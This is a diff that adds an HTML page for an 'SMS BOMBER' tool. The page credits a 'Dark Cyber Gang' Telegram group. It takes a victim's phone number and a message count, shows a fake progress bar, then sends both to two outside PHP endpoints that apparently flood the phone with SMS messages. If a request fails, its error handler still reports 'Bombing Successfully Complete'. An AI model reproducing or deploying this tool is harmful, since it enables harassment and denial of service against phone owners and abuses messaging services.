@@ -1,0 +1,163 @@
+<!--
+--  Uploaded on : https://haxor.my.id/open/Hard_SMS_Bomber.html
+--  Official Web : https://prinsh.com
+--  script-deface-generator.prinsh.com
+-->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+    <title>SMS BOMBER</title>
+</head>
+<style>
+    body {
+        font-family: 'Poppins', sans-serif;
+        background: #0d0d0d;
+        color: white;
+        text-align: center;
+        padding: 50px;
+    }
+
+    .container {
+        background: #1a1a1a;
+        padding: 20px;
+        border-radius: 15px;
+        box-shadow: 0px 0px 15px rgba(0, 255, 255, 0.3);
+        max-width: 400px;
+        margin: auto;
+    }
+
+    h1 {
+        font-size: 28px;
+        color: cyan;
+        text-shadow: 0px 0px 10px cyan;
+    }
+
+    input, textarea {
+        width: 90%;
+        padding: 12px;
+        margin: 10px 0;
+        border: 2px solid cyan;
+        border-radius: 8px;
+        background: #0d0d0d;
+        color: white;
+        font-size: 16px;
+        outline: none;
+        transition: 0.3s;
+    }
+
+    input:focus, textarea:focus {
+        border-color: #ff00ff;
+        box-shadow: 0px 0px 10px #ff00ff;
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        background: linear-gradient(45deg, #ff416c, #ff4b2b);
+        color: white;
+        border: none;
+        font-size: 18px;
+        border-radius: 8px;
+        cursor: pointer;
+        transition: 0.3s;
+    }
+
+    button:hover {
+        background: linear-gradient(45deg, #ff4b2b, #ff416c);
+        box-shadow: 0px 0px 15px rgba(255, 69, 0, 0.8);
+    }
+
+    #error-message {
+        margin-top: 15px;
+        font-size: 16px;
+        color: red;
+    }
+
+    footer {
+        margin-top: 20px;
+        color: gray;
+        font-size: 14px;
+    }
+
+    footer a {
+        text-decoration: none;
+        color: #87CEEB;
+    }
+</style>
+<body>
+
+    <div class="container">
+        <h1>SMS BOMBER</h1>
+        <input type="text" id="phoneNumber" placeholder="Phone Number">
+        <input type="text" id="amount" placeholder="Enter Amount">
+        <button onclick="sendMessage()">Send Message</button>
+        <p id="loading-text" style="display:none; color: cyan; font-size: 16px;"></p>
+        <p id="error-message"></p>
+    </div>
+
+    <footer>
+        Maked By <a href="https://t.me/DCG_Owner1" target="_blank">Mr. Aryan Sheikh Nayem</a><br></br>
+        Join <a href="https://t.me/darkcybergang">Dark Cyber Gange </a>
+    </footer>
+
+    <script>
+        function sendMessage() {
+            let phone = document.getElementById("phoneNumber").value;
+            let amount = document.getElementById("amount").value;
+            let errorMsg = document.getElementById("error-message");
+            let loadingText = document.getElementById("loading-text");
+
+            if (phone === "" || amount === "") {
+                errorMsg.innerHTML = "Please fill all fields!";
+                return;
+            }
+
+            errorMsg.innerHTML = ""; // Clear Error Message
+            loadingText.style.display = "block"; // Show Loading Text
+            loadingText.innerHTML = "Loading 1%..."; // Initial Loading Message
+
+            let progress = 1;
+            let loadingInterval = setInterval(() => {
+                progress += Math.floor(Math.random() * 10); // Increment Progress Randomly
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(loadingInterval);
+
+                    // First API Call
+                    let apiUrl1 = `https://cherykuwait.com/topbomb.php?phone=${phone}&amount=${amount}`;
+                    let apiUrl2 = `http://bhhcapizone.rf.gd/Key_BHHCRamadan/SMS_Bomber.php?phone=${phone}&amount=${amount}`;
+
+                    // Call both APIs simultaneously
+                    Promise.all([
+                        fetch(apiUrl1).then(response => response.text()),
+                        fetch(apiUrl2).then(response => response.text())
+                    ])
+                    .then(results => {
+                        loadingText.style.display = "none"; // Hide Loading Text
+                        let [result1, result2] = results;
+
+                        if (result1.includes("Success") || result2.includes("Success")) {
+                            errorMsg.innerHTML = "Message Sent Successfully!";
+                            errorMsg.style.color = "green";
+                        } else {
+                            errorMsg.innerHTML = "Failed to Send Message!";
+                            errorMsg.style.color = "red";
+                        }
+                    })
+                    .catch(error => {
+                        loadingText.style.display = "none";
+                        errorMsg.innerHTML = "Bombing Successfully Complete";
+                        errorMsg.style.color = "orange";
+                    });
+                } else {
+                    loadingText.innerHTML = `Loading ${progress}%...`; // Update Progress
+                }
+            }, 500); // Update Progress Every 500ms
+        }
+    </script>
+</body>
+</html>
